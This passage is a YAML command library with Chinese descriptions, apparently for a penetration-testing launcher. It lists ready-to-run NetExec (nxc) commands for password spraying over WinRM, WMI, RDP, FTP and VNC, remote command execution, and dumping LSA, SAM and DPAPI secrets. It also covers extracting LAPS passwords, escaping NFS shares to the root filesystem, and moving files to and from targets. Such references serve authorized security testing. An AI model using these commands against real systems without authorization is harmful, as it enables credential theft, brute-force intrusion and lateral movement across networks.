  - title: nxc ssh - 上传文件到远程
    desc: |
      通过 SCP 将文件上传到远程系统。使用 SSH/SCP 将本地文件传输到远程系统。
    command: "nxc ssh {{target}} -u {{username}} -p {{password}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|/tmp/file.txt}}"

  # ============================================================================
  # WinRM PROTOCOL
  # ============================================================================

  - title: nxc winrm - 基础认证
    desc: |
      使用用户名和密码认证 WinRM 服务。测试 WinRM 凭据。可执行代码时显示（Pwn3d!）。
    command: "nxc winrm {{target}} -u {{username}} -p {{password}}"

  - title: nxc winrm - 带域认证
    desc: |
      当 SMB 端口关闭时带域认证 WinRM。使用 -d 标志指定域并避免 SMB 连接。
    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -d {{domain|DOMAIN}}"

  - title: nxc winrm - 执行命令
    desc: |
      通过 WinRM 在远程系统上执行命令。运行 PowerShell 命令并显示输出。成功后显示（Pwn3d!）。
    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -X {{command|whoami}}"

  - title: nxc winrm - 密码喷洒
    desc: |
      对 WinRM 服务进行密码喷洒。对多个 WinRM 主机测试凭据。使用 --no-bruteforce 进行 1:1 用户:密码映射。
    command: "nxc winrm {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  - title: nxc winrm - 转储 LSA 机密
    desc: |
      通过 WinRM 从远程系统转储 LSA 机密。提取缓存的凭据和服务账户密码。需要管理员权限。
    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M lsassy"

  - title: nxc winrm - 转储 SAM 数据库
    desc: |
      通过 WinRM 从远程系统转储 SAM 数据库。提取本地账户密码哈希。需要 SYSTEM 权限。
    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M sam"

  - title: nxc winrm - 转储 DPAPI 机密
    desc: |
      通过 WinRM 从远程系统转储 DPAPI 机密。提取 Windows 应用存储的加密凭据。
    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M dpapi"

  - title: nxc winrm - 突破 LAPS
    desc: |
      通过 WinRM 提取 LAPS 密码。通过 WinRM 从域中获取托管的本地管理员密码。
    command: "nxc winrm {{target}} -u {{username}} -p {{password}} -M laps"

  # ============================================================================
  # WMI PROTOCOL
  # ============================================================================

  - title: nxc wmi - Windows 认证
    desc: |
      使用 Windows 认证认证 WMI。默认认证方法。使用 Windows 凭据进行 WMI 访问。
    command: "nxc wmi {{target}} -u {{username}} -p {{password}}"

  - title: nxc wmi - 带域的 Windows 认证
    desc: |
      当 SMB 端口关闭时使用 Windows 认证认证 WMI。用 -d 标志指定域以避免 SMB 连接。
    command: "nxc wmi {{target}} -u {{username}} -p {{password}} -d {{domain|DOMAIN}}"

  - title: nxc wmi - 本地认证
    desc: |
      使用本地认证认证 WMI。使用 --local-auth 标志使用本地账户而非域账户。
    command: "nxc wmi {{target}} -u {{username}} -p {{password}} --local-auth"

  - title: nxc wmi - 执行命令
    desc: |
      通过 WMI 在远程系统上执行命令。通过 WMI 运行命令并显示输出。获得本地管理员访问时显示（Pwn3d!）。
    command: "nxc wmi {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"

  - title: nxc wmi - 密码喷洒
    desc: |
      对 WMI 服务进行密码喷洒。对多个 WMI 主机测试凭据。使用 --no-bruteforce 进行 1:1 用户:密码映射。
    command: "nxc wmi {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  # ============================================================================
  # RDP PROTOCOL
  # ============================================================================

  - title: nxc rdp - 基础认证
    desc: |
      使用用户名和密码认证 RDP 服务。测试 RDP 凭据。可执行代码时显示（Pwn3d!）。
    command: "nxc rdp {{target}} -u {{username}} -p {{password}}"

  - title: nxc rdp - 密码喷洒
    desc: |
      对 RDP 服务进行密码喷洒。对多个 RDP 主机测试凭据。注意账户锁定！
    command: "nxc rdp {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}}"

  - title: nxc rdp - 不暴力破解的密码喷洒
    desc: |
      1:1 用户:密码映射的密码喷洒。每个用户与文件中对应的密码匹配。user1=>pass1、user2=>pass2。
    command: "nxc rdp {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}} --no-bruteforce"

  - title: nxc rdp - 执行命令
    desc: |
      通过 RDP 在远程系统上执行命令。通过 RDP 会话运行命令。成功后显示（Pwn3d!）。
    command: "nxc rdp {{target}} -u {{username}} -p {{password}} -x {{command|whoami}}"

  - title: nxc rdp - 截屏（已连接）
    desc: |
      连接时对 RDP 会话截屏。捕获活动 RDP 会话的屏幕。用于侦察。
    command: "nxc rdp {{target}} -u {{username}} -p {{password}} --screenshot"

  - title: nxc rdp - 截屏（无 NLA、未连接）
    desc: |
      未连接时在无 NLA 的情况下截屏。尝试在禁用 NLA 的 RDP 服务器上捕获登录屏幕。
    command: "nxc rdp {{target}} --screenshot-no-nla"

  # ============================================================================
  # FTP PROTOCOL
  # ============================================================================

  - title: nxc ftp - 基础认证
    desc: |
      使用用户名和密码认证 FTP 服务器。测试 FTP 凭据。FTP 协议无（Pwn3d!）检查。
    command: "nxc ftp {{target}} -u {{username}} -p {{password}}"

  - title: nxc ftp - 密码喷洒
    desc: |
      对 FTP 服务器进行密码喷洒。对多个 FTP 主机测试凭据。使用 --no-bruteforce 进行 1:1 用户:密码映射。
    command: "nxc ftp {{target}} -u {{users_file|~/users.txt}} -p {{passwords_file|~/passwords.txt}} --no-bruteforce"

  - title: nxc ftp - 成功后继续的密码喷洒
    desc: |
      成功登录后继续密码喷洒。适用于对大型用户列表喷洒单个密码。
    command: "nxc ftp {{target}} -u {{users_file|~/users.txt}} -p {{password|Summer18}} --continue-on-success"

  - title: nxc ftp - 列出文件
    desc: |
      列出 FTP 服务器上的文件。枚举 FTP 共享中的文件和目录。用于侦察。
    command: "nxc ftp {{target}} -u {{username}} -p {{password}} --list"

  - title: nxc ftp - 从远程获取文件
    desc: |
      从 FTP 服务器下载文件。通过 FTP 将文件从远程传输到本地系统。
    command: "nxc ftp {{target}} -u {{username}} -p {{password}} --get-file {{remote_path|/file.txt}} {{local_path|/tmp/file.txt}}"

  - title: nxc ftp - 上传文件到远程
    desc: |
      将文件上传到 FTP 服务器。通过 FTP 将本地文件传输到远程系统。
    command: "nxc ftp {{target}} -u {{username}} -p {{password}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|/file.txt}}"

  # ============================================================================
  # NFS PROTOCOL
  # ============================================================================

  - title: nxc nfs - 枚举 NFS 服务器
    desc: |
      枚举 NFS 服务器信息。检测支持的 NFS 版本并检查 root 逃逸漏洞。
    command: "nxc nfs {{target}}"

  - title: nxc nfs - 枚举共享
    desc: |
      枚举导出的 NFS 共享。列出所有可用的 NFS 共享及其权限、存储使用情况和访问列表。
    command: "nxc nfs {{target}} --shares"

  - title: nxc nfs - 列出共享上的文件
    desc: |
      列出特定 NFS 共享上的文件。显示指定共享路径中的文件和目录。
    command: "nxc nfs {{target}} --share {{share_path|/var/nfs/general}} --ls {{path|/}}"

  - title: nxc nfs - 递归枚举共享
    desc: |
      递归枚举 NFS 共享上的所有文件。按指定深度（默认 3）递归发现文件和文件夹。
    command: "nxc nfs {{target}} --enum-shares"

  - title: nxc nfs - 使用自定义深度枚举
    desc: |
      使用自定义递归深度枚举共享。指定递归枚举的深度（默认为 3 层）。
    command: "nxc nfs {{target}} --enum-shares {{depth|5}}"

  - title: nxc nfs - 下载文件
    desc: |
      从 NFS 共享下载文件。将文件从远程 NFS 共享传输到本地系统。
    command: "nxc nfs {{target}} --share {{share_path|/var/nfs/general}} --get-file {{remote_path|/file.txt}} {{local_path|/tmp/file.txt}}"

  - title: nxc nfs - 上传文件
    desc: |
      将文件上传到 NFS 共享。将本地文件传输到远程 NFS 共享。
    command: "nxc nfs {{target}} --share {{share_path|/var/nfs/general}} --put-file {{local_path|/tmp/file.txt}} {{remote_path|/file.txt}}"

  - title: nxc nfs - 逃逸到根文件系统
    desc: |
      尝试在 NFS 上进行根文件系统逃逸。利用 NFS 错误配置访问根文件系统。需要 root 逃逸漏洞。
    command: "nxc nfs {{target}} --root-escape"

  # ============================================================================
  # VNC PROTOCOL
  # ============================================================================

  - title: nxc vnc - 基础认证
    desc: |
      使用密码认证 VNC 服务器。测试 VNC 凭据。可执行代码时显示（Pwn3d!）。
    command: "nxc vnc {{target}} -p {{password}}"

  - title: nxc vnc - 密码喷洒
    desc: |
      对 VNC 服务器进行密码喷洒。对多个 VNC 主机测试密码。
    command: "nxc vnc {{target}} -p {{passwords_file|~/passwords.txt}}"

